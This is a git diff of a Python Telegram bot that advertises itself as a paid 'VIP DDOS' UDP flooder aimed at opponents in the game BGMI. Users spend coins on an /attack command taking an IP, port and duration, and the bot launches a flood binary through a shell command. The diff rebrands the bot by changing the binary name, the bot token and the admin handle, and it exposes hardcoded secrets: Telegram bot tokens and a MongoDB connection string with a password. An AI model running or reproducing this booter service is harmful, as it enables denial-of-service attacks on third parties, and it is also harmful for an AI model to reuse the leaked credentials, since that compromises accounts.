@@ -9,8 +9,8 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7970036127:AAEoiP59YmvuxDsuf_JEP6LsPaqh_6ihipI'  # Replace with your bot token
-ADMIN_USER_ID = 7584228621
+TELEGRAM_BOT_TOKEN = '8042326539:AAH4CdJsBrO9BM72u86Pv2v7u35ttokyqMs'  # Replace with your bot token
+ADMIN_USER_ID = 5486683891
 MONGO_URI = "mongodb+srv://golem:golempapa123@golem.ijr3g.mongodb.net/?retryWrites=true&w=majority&appName=golem"
 DB_NAME = "golem"
 COLLECTION_NAME = "users"
@@ -40,7 +40,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*❄️ WELCOME TO @GOLEM_OWNER ULTIMATE UDP FLOODER ❄️*\n\n"
+        "*❄️ WELCOME TO  ULTIMATE UDP FLOODER ❄️*\n\n"
         "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
@@ -49,7 +49,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ Kaise Use Kare? ⚠️*\n"
         "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @GOLEM_OWNER*"
+        "*Contact Admin: *"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -92,7 +92,7 @@ async def attack(update: Update, context: CallbackContext):
     if user["coins"] < COINS_REQUIRED_PER_ATTACK:
         await context.bot.send_message(
             chat_id=chat_id,
-            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @GOLEM_OWNER*",
+            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- *",
             parse_mode='Markdown'
         )
         return
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./golemop {ip} {port} {duration} {999}"
+        command = f"./bgmi {ip} {port} {duration} {400}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -230,7 +230,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ @GOLEM_OWNER VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️  VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -250,7 +250,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
         "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
         "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
-        "- *Agar koi dikkat aaye toh admin ko contact karo: @GOLEM_OWNER*\n\n"
+        "- *Agar koi dikkat aaye toh admin ko contact karo: *\n\n"
         "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
